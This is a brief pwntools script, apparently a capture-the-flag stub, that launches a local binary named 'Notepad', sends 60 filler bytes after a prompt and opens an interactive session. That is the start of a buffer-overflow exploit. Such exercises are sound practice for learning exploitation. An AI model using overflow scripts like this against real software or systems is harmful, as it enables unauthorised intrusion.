from pwn import *

exe = ELF('./Notepad', checksec=False)
context.binary = exe.path

p = process(exe.path)

input()
payload = b'a'*60
p.sendafter(b'\n', payload)

p.interactive()